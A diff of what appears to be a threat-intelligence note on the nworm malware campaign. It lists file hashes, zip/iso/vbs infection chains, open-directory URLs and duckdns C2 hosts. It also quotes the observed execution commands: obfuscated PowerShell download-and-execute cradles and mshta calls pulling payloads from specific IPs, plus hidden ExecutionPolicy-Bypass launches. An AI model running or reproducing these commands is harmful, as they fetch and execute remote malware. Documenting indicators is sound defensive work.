@@ -1,44 +1,31 @@
-nworm | 22.02.2022 | v0.3.8
+nworm | 10.02.2022 | v0.3.8
 
 ********************************************************************************
 
-.vbs adf6d30e5c3767c268a66aa887dff2ebe4d0295c49c9bc42d343b6dd0e707825
-.vbs 834ebbc3312439a9186f81f6b362e0969a3774cc28a8539e7950912b909e82b8
-.ps1 32060ba18c4ed29f6a441b6193a2e6376bb43c752709558f046e9365b7275559
+.zip > .iso > .vbs
+.zip > .iso > .exe
 
-********************************************************************************
+.zip 2bb4298124543435996353e79aa974731072f43f8cc1ac17269b668ce5fac6ed
+.zip 4c68b39419eb4731be0c0475a4b63fd9cb86261bec9421131013ac20ea5f7b30
+
 
 EXEC > 
 
 ISSVULHWACHLPTGHUNSEZBHITDJCYSVUKKGQHLSCPYQYLHSHFDDDKXHBOOLHYAHOOCFW.vbs
-
-msHta.exe Http://3.145.46.6/K/EncKAO.txt
-
-powershell.exe $HCNPXUQJCLATJSNVPNHGASK = '[*4@!-95&[27011]{{<!4(}y*4@!-95&[27011]{{<!4(}t3{{!{39=335@-#%2^${![292#\&3/-4=3%^]+\@8_#2}.IO.*4@!-95&[27011]{{<!4(}t()&/@+/6!@3=1*&#^285<53{{!{39=335@-#%2^${![25_8%0=^\09<276{[=(-\-{92#\&3/-4=3%^]+\@8_#2}()&/@+/6!@3=1*&#^285<53{{!{39=335@-#%2^${![25_8%0=^\09<276{[=(-\-{d3{{!{39=335@-#%2^${![2()&/@+/6!@3=1*&#^285<5]'.Replace('*4@!-95&[27011]{{<!4(}','S').Replace('3{{!{39=335@-#%2^${![2','E').Replace('()&/@+/6!@3=1*&#^285<5','R').Replace('5_8%0=^\09<276{[=(-\-{','A').Replace('92#\&3/-4=3%^]+\@8_#2}','M');$HWBPFQSKIJPSNVWGRPDVWTQ = ($HCNPXUQJCLATJSNVPNHGASK -Join '')|&('I'+'EX');$HVVGCGZUOWJPPVKKFNXPRYX = '[-<@!(_!_@2#@@73#6#<*68y-<@!(_!_@2#@@73#6#<*6834^%[/28$^_^1)_+%&$}{2/=+\6{8&8!=%9$&6%0#$!1m.N/=+\6{8&8!=%9$&6%0#$!134^%[/28$^_^1)_+%&$}{2.W/=+\6{8&8!=%9$&6%0#$!1bR/=+\6{8&8!=%9$&6%0#$!1qu/=+\6{8&8!=%9$&6%0#$!1-<@!(_!_@2#@@73#6#<*6834^%[/28$^_^1)_+%&$}{2]'.Replace('-<@!(_!_@2#@@73#6#<*68','S').Replace('/=+\6{8&8!=%9$&6%0#$!1','E').Replace('34^%[/28$^_^1)_+%&$}{2','T');$HZSWCZCRBXDIWQKWTESQTIY = ($HVVGCGZUOWJPPVKKFNXPRYX -Join '')|&('I'+'EX');$HFJRRSZDESQZWRCXANLTRDS = '\=)9&+81%{23</-^[/=-[6r7-{)&9)1(!_(2]+86%-(=5a+8#6&}]%/5}-^]%]5<#$7+7-{)&9)1(!_(2]+86%-(=5'.Replace('\=)9&+81%{23</-^[/=-[6','C').Replace('7-{)&9)1(!_(2]+86%-(=5','E').Replace('+8#6&}]%/5}-^]%]5<#$7+','T');$HWCLNHXSDRQHGEGSDTPUANI = '$#][}(-9<9$33&7@-{54#^-0@}{9!{69/<}19_19+_5&tR-0@}{9!{69/<}19_19+_5&0$}\+-8(030\)(%<}^/736pon0$}\+-8(030\)(%<}^/736-0@}{9!{69/<}19_19+_5&'.Replace('$#][}(-9<9$33&7@-{54#^','G').Replace('-0@}{9!{69/<}19_19+_5&','E').Replace('0$}\+-8(030\)(%<}^/736','S');$HUNOTPOSFQRHVLUSSYXPQCA = 'G_]@_61$7+/%50=7%)5}$+*t(#(&<<]#_^68#}}%]-#61#_]@_61$7+/%50=7%)5}$+*43=743-[#=!81/<[(**(<[pon43=743-[#=!81/<[(**(<[_]@_61$7+/%50=7%)5}$+*43=743-[#=!81/<[(**(<[t(#(&<<]#_^68#}}%]-#61#_]@_61$7+/%50=7%)5}$+*am'.Replace('43=743-[#=!81/<[(**(<[','S').Replace('_]@_61$7+/%50=7%)5}$+*','E').Replace('(#(&<<]#_^68#}}%]-#61#','R');$HHGZUQOYZVBAZGKFOKONHQP = '{[)9)4\#-&640<2_1%000//30#)6832^&7)=]=!{%8-_a20&[#8=\]=4}\*/8^-5_^+To/30#)6832^&7)=]=!{%8-_n20&[#8=\]=4}\*/8^-5_^+'.Replace('{[)9)4\#-&640<2_1%000/','R').Replace('/30#)6832^&7)=]=!{%8-_','E').Replace('20&[#8=\]=4}\*/8^-5_^+','D');&('I'+'EX')($HWBPFQSKIJPSNVWGRPDVWTQ::new($HZSWCZCRBXDIWQKWTESQTIY::$HFJRRSZDESQZWRCXANLTRDS('HttP://3.145.46.6/K/ServerFAH.txt').$HWCLNHXSDRQHGEGSDTPUANI().$HUNOTPOSFQRHVLUSSYXPQCA()).$HHGZUQOYZVBAZGKFOKONHQP())
-
-powershell.exe -NoE -Nop -NonI -WIndoWSTYLe HiDdeN -ExecutionPolicy Bypass -file C:\ProgramData\LZAVOBYIRFWZQZVCTGHPQB\LZAVOBYIRFWZQZVCTGHPQB.ps1
-
-WScript.exe C:\ProgramData\LZAVOBYIRFWZQZVCTGHPQB\LZAVOBYIRFWZQZVCTGHPQB.vbs
-
-cmd.exe /c C:\ProgramData\LZAVOBYIRFWZQZVCTGHPQB\LZAVOBYIRFWZQZVCTGHPQB.bat
-
-cMd.E"x"e  /c =PoWerShelL"."eXe -noe -nop -nonI -WIndoWSTYLe Hidden -executionPolicy Bypass -file C:\ProgramData\LZAVOBYIRFWZQZVCTGHPQB\WZQNBDSLVGAWPUXJRUVDYE.ps1
-
-PoWerShelL"."eXe  -noe -nop -nonI -WIndoWSTYLe Hidden -executionPolicy Bypass -file C:\ProgramData\LZAVOBYIRFWZQZVCTGHPQB\WZQNBDSLVGAWPUXJRUVDYE.ps1
+>
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $HUEFUTBTCTLCFKDGFALECUN = '[*+5&/!3<</(%3<$$&<1@#-y*+5&/!3<</(%3<$$&<1@#-t/%&1&+&7=!@8-0(0-+8%$\[/&]9}][1_+@%-&<&#^--%.IO.*+5&/!3<</(%3<$$&<1@#-t)*({3!_=3]@{-+1\}@%{88/%&1&+&7=!@8-0(0-+8%$\4}84}8705\01[/#-(6&19%[/&]9}][1_+@%-&<&#^--%)*({3!_=3]@{-+1\}@%{88/%&1&+&7=!@8-0(0-+8%$\4}84}8705\01[/#-(6&19%d/%&1&+&7=!@8-0(0-+8%$\)*({3!_=3]@{-+1\}@%{88]'.RePlace('*+5&/!3<</(%3<$$&<1@#-','S').RePlace('/%&1&+&7=!@8-0(0-+8%$\','E').RePlace(')*({3!_=3]@{-+1\}@%{88','R').RePlace('4}84}8705\01[/#-(6&19%','A').RePlace('[/&]9}][1_+@%-&<&#^--%','M');$HHPCXNLYCJNJNANYSIXGBXB = ($HUEFUTBTCTLCFKDGFALECUN -Join '')|&('I'+'EX');$HBSWWCHKJPHCIHYLPBADIVC = '[%=}3&3{997<)<9(\/#$9]_y%=}3&3{997<)<9(\/#$9]_#[{9@(%3!%*}#!(]]5)5+%!^%)7)_4&^+#%{370{3-#%m.N!^%)7)_4&^+#%{370{3-#%#[{9@(%3!%*}#!(]]5)5+%.W!^%)7)_4&^+#%{370{3-#%bR!^%)7)_4&^+#%{370{3-#%qu!^%)7)_4&^+#%{370{3-#%%=}3&3{997<)<9(\/#$9]_#[{9@(%3!%*}#!(]]5)5+%]'.RePlace('%=}3&3{997<)<9(\/#$9]_','S').RePlace('!^%)7)_4&^+#%{370{3-#%','E').RePlace('#[{9@(%3!%*}#!(]]5)5+%','T');$HRKBGLQEIIOTGKRAVGDLNFB = ($HBSWWCHKJPHCIHYLPBADIVC -Join '')|&('I'+'EX');$HEKLNIBCXUJQWGFRURKPEYH = '}=5(@3]#3)+286%^()-%7%r\9-9[^\2<62^/3@+]3!){}a^[0__=$7}#(@{][37@^2_&\9-9[^\2<62^/3@+]3!){}'.RePlace('}=5(@3]#3)+286%^()-%7%','C').RePlace('\9-9[^\2<62^/3@+]3!){}','E').RePlace('^[0__=$7}#(@{][37@^2_&','T');$HEBZUFQTNVBUTPKTLSTLJWS = '<=7#5]=_4*+3-]/7}6)-!)\(9%[{[/5=6/[(%9(&%592tR\(9%[{[/5=6/[(%9(&%592++4/41*0$\7@})4_2\{5$/Pon++4/41*0$\7@})4_2\{5$/\(9%[{[/5=6/[(%9(&%592'.RePlace('<=7#5]=_4*+3-]/7}6)-!)','G').RePlace('\(9%[{[/5=6/[(%9(&%592','E').RePlace('++4/41*0$\7@})4_2\{5$/','S');$HHPHRZIHNFHAGPKYQIXDUFE = 'G-^{}6\%&!4)-{0/-92=!)1t1/=&068/-*)_2^(\@_)-}7-^{}6\%&!4)-{0/-92=!)1\{1@=&(406!]](!]+[#[08Pon\{1@=&(406!]](!]+[#[08-^{}6\%&!4)-{0/-92=!)1\{1@=&(406!]](!]+[#[08t1/=&068/-*)_2^(\@_)-}7-^{}6\%&!4)-{0/-92=!)1am'.RePlace('\{1@=&(406!]](!]+[#[08','S').RePlace('-^{}6\%&!4)-{0/-92=!)1','E').RePlace('1/=&068/-*)_2^(\@_)-}7','R');$HXLYDESAYDAKLLLAJUVKBOS = '85{2//*@5<)-^[3_)00#@2449$6@_2+[6{+*=970##$_a101-}+2!%$[72+-&{7+39{To449$6@_2+[6{+*=970##$_n101-}+2!%$[72+-&{7+39{'.RePlace('85{2//*@5<)-^[3_)00#@2','R').RePlace('449$6@_2+[6{+*=970##$_','E').RePlace('101-}+2!%$[72+-&{7+39{','D');&('I'+'EX')($HHPCXNLYCJNJNANYSIXGBXB::new($HRKBGLQEIIOTGKRAVGDLNFB::$HEKLNIBCXUJQWGFRURKPEYH('HttP://54.235.58.2/3/Y7839.txt').$HEBZUFQTNVBUTPKTLSTLJWS().$HHPHRZIHNFHAGPKYQIXDUFE()).$HXLYDESAYDAKLLLAJUVKBOS())
 
 
-Network
+http://54.235.58.2/3/Y7839.txt (.ps1)
+http://54.235.58.2/3/ServR43.txt (.ps1)
 
-http://3.145.46.6/K/EncKAO.txt (vbs)
-http://3.145.46.6/K/ServerFAH.txt (ps1)
+#OpenDir's
 
-#OpenDirs
+http://54.235.58.2/
+http://54.235.58.2/1/
+http://54.235.58.2/2/
+http://54.235.58.2/3/
 
-http://3.145.46.6/
-http://3.145.46.6/M/
-http://3.145.46.6/K/
-
-nw0rm c2's
-
+c2's
 nyanmoj.duckdns.org:5057
 moneyhope81.duckdns.org:5057
